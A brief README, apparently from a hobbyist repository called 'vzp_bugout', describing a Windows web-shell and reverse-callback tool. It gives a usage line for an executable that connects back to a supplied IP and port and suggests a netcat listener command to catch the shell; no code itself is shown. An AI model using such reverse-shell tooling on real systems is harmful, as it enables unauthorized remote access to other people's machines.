# vzp_bugout
fun with python, windows web shells, and trying to get more interactive callbacks
<br>
The python is here, feel free to steal, that's what I did.
<br>
USAGE:  bugout.exe <youripaddr> <yourportlistener>
<br>
maybe setup a: nc -nlvp 3333 first or something.
<br>
No idea how this really works yet...
